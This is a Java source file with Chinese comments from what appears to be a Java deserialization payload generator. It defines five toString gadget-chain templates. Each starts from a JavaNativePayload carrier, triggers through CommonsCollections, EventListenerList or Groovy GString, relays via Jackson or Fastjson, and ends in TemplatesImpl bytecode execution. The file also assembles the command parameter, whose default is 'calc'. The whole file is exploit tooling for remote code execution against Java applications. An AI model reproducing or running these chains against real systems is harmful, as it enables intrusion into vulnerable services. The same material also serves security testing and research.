package payload;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * toString 触发链的预设模板：把「哪个类被 toString」与「toString 之后怎么走」拆开。
 *
 * <p>本类只收集模板与参数，构建仍走 {@link PayloadEngine}。模板里的节点序列全部来自
 * 上游元数据实测（见 docs/DESIGN-payload.md），并逐条构建验证过：
 * <ul>
 *   <li>触发节点是链的第一个 gadget：载体之后必须先接触发节点，再接中继节点。
 *       早期版本把触发节点漏在模板之外，五条模板全部报「链不被引擎认可」——</li>
 *   <li>中继节点只有 {@code JacksonToString} 与 {@code FastjsonToString1} 两个能接上
 *       字节码链路，{@code ROMEToStringBean} / {@code XBeanToString} 在本工具的运行方式下不可用；</li>
 *   <li>{@code XString} / {@code XalanXString} 系列在 JreFilter 下不构成合法链，
 *       带有 {@code HighJDK} 后缀的模板需要额外开放 {@code java.io} / {@code java.util}，
 *       在 run.ps1 的两个 --add-opens 下同样不可用，因此都不收录。</li>
 * </ul>
 *
 * <p>自定义目标类通过 {@code BytecodeConvert.classNameMode=manual} 与
 * {@code BytecodeConvert.className} 生效：链路末端仍有实际执行动作，
 * 类名只决定落地类的名字，不会改变链的触发方式。
 */
public final class ToStringPreset {

    /** 一条 toString 链模板。 */
    public static final class Template {
        /** 稳定标识，用于配置键与复制模板的标记。 */
        public final String id;
        /** 界面显示名。 */
        public final String name;
        /** 一句话说明。 */
        public final String summary;
        /** toString 触发节点：链的第一个 gadget。 */
        public final String trigger;
        /** 完整 gadget 序列（含触发节点，不含载体）。 */
        public final List<String> gadgets;
        /** 该模板是否适合高版本 JDK 目标。 */
        public final String jdk;
        /** 依赖组件，例如 CommonsCollections3；没有则为空串。 */
        public final String dependency;

        Template(String id, String name, String summary, String trigger, List<String> gadgets,
                 String jdk, String dependency) {
            this.id = id == null ? "" : id;
            this.name = name == null || name.trim().isEmpty() ? this.id : name;
            this.summary = summary == null ? "" : summary;
            this.trigger = trigger == null ? "" : trigger;
            this.gadgets = Collections.unmodifiableList(new ArrayList<String>(gadgets));
            this.jdk = jdk == null ? "" : jdk;
            this.dependency = dependency == null ? "" : dependency;
        }

        /** 链的完整展示文本，载体在链首。 */
        public String chainText() {
            StringBuilder text = new StringBuilder(ToStringPreset.carrier());
            for (String node : gadgets) text.append(" -> ").append(node);
            return text.toString();
        }

        /** 触发后的链路（不含触发节点本身），用于说明「触发之后走了哪些节点」。 */
        public List<String> tail() {
            return gadgets.isEmpty()
                    ? new ArrayList<String>() : new ArrayList<String>(gadgets.subList(1, gadgets.size()));
        }
    }

    /** 载体：toString 触发链统一从 JavaNativePayload 起，实测其余载体接不上触发节点。 */
    private static final String CARRIER = "javanativepayload";
    /** 字节码链路：触发节点之后把字节码真正执行起来。 */
    private static final List<String> EXEC_TAIL = Collections.unmodifiableList(Arrays.asList(
            "templatesimpl", "bytecodeconvert", "exec"));
    /** 中继节点：把触发结果转成字节码链路可接受的形态。 */
    private static final String RELAY_JACKSON = "jacksontostring";
    private static final String RELAY_FASTJSON = "fastjsontostring1";

    /** 触发节点：与 {@link ChainScope} 登记的清单同源。 */
    private static final String TRIGGER_CC3 = "caseinsensitivemap3tostring";
    private static final String TRIGGER_CC4 = "caseinsensitivemap4tostring";
    private static final String TRIGGER_EVENT_LISTENER = "eventlistenerlisttostring";
    private static final String TRIGGER_GSTRING = "gstringcomparetotostring";

    /** 自定义目标类的参数键：与 {@link JarPreset} 共用同一套写法。 */
    private static final String CLASS_NAME_MODE_PARAM = "BytecodeConvert.classNameMode";
    private static final String CLASS_NAME_PARAM = "BytecodeConvert.className";
    /** 命令参数键。 */
    private static final String COMMAND_PARAM = "Exec.cmd";
    /** 命令默认值：与上游预设保持一致。 */
    private static final String COMMAND_DEFAULT = "calc";

    private ToStringPreset() {
    }

    /** 载体 id。 */
    public static String carrier() {
        return CARRIER;
    }

    /** 命令参数的完整键。 */
    public static String commandParam() {
        return COMMAND_PARAM;
    }

    /** 命令参数默认值。 */
    public static String commandDefault() {
        return COMMAND_DEFAULT;
    }

    /** 全部模板，按「先通用后专用」的顺序。 */
    public static List<Template> templates() {
        List<Template> templates = new ArrayList<Template>();
        templates.add(new Template("ts.cc3.jackson", "CC3 toString + Jackson",
                "CommonsCollections3 CaseInsensitiveMap 触发，Jackson 中继到字节码执行",
                TRIGGER_CC3, chain(TRIGGER_CC3, RELAY_JACKSON), "JDK 8 / 11", "commons-collections:3.x"));
        templates.add(new Template("ts.cc4.jackson", "CC4 toString + Jackson",
                "CommonsCollections4 CaseInsensitiveMap 触发，Jackson 中继到字节码执行",
                TRIGGER_CC4, chain(TRIGGER_CC4, RELAY_JACKSON), "JDK 8 / 11", "commons-collections4"));
        templates.add(new Template("ts.cc3.fastjson", "CC3 toString + Fastjson",
                "CommonsCollections3 触发，Fastjson 中继；目标依赖 Fastjson 时使用",
                TRIGGER_CC3, chain(TRIGGER_CC3, RELAY_FASTJSON), "JDK 8 / 11",
                "fastjson + commons-collections:3.x"));
        templates.add(new Template("ts.eventlistener.jackson", "EventListenerList toString",
                "JDK 内置 EventListenerList 触发，不依赖第三方集合库，Jackson 中继",
                TRIGGER_EVENT_LISTENER, chain(TRIGGER_EVENT_LISTENER, RELAY_JACKSON),
                "JDK 8 / 11", "jackson-databind"));
        templates.add(new Template("ts.gstring.jackson", "GString compareTo toString",
                "Groovy GString compareTo 触发，Jackson 中继",
                TRIGGER_GSTRING, chain(TRIGGER_GSTRING, RELAY_JACKSON), "JDK 8 / 11",
                "groovy + jackson-databind"));
        return Collections.unmodifiableList(templates);
    }

    /** 触发节点 + 中继 + 字节码链路：顺序固定，任一段缺失都会让链不成立。 */
    private static List<String> chain(String trigger, String relayNode) {
        List<String> nodes = new ArrayList<String>();
        nodes.add(trigger);
        nodes.add(relayNode);
        nodes.addAll(EXEC_TAIL);
        return nodes;
    }

    /** 按标识取模板；找不到返回 null，由调用方给出可读提示。 */
    public static Template byId(String id) {
        if (id == null) return null;
        for (Template template : templates()) {
            if (template.id.equalsIgnoreCase(id.trim())) return template;
        }
        return null;
    }

    /** 默认模板标识，界面首次进入时预选。 */
    public static String defaultId() {
        return "ts.cc3.jackson";
    }

    /**
     * 组装参数。
     *
     * <p>空值不下发：下发空串会覆盖引擎默认值，实测表现为载荷里的命令为空。
     *
     * @param templateId  模板标识
     * @param command     自定义命令；留空用默认值
     * @param targetClass 自定义目标类名；留空则沿用引擎随机类名
     */
    public static Map<String, Object> params(String templateId, String command, String targetClass) {
        Map<String, Object> params = new LinkedHashMap<String, Object>();
        if (byId(templateId) == null) return params;
        String chosen = command == null || command.trim().isEmpty() ? COMMAND_DEFAULT : command.trim();
        params.put(COMMAND_PARAM, chosen);
        String custom = targetClass == null ? "" : targetClass.trim();
        if (!custom.isEmpty()) {
            params.put(CLASS_NAME_MODE_PARAM, "manual");
            params.put(CLASS_NAME_PARAM, custom);
        }
        return params;
    }

    /** 未选模板时的提示；模板存在时返回空串。 */
    public static String issue(String templateId) {
        return byId(templateId) == null ? "请选择一条 toString 链模板。" : "";
    }
}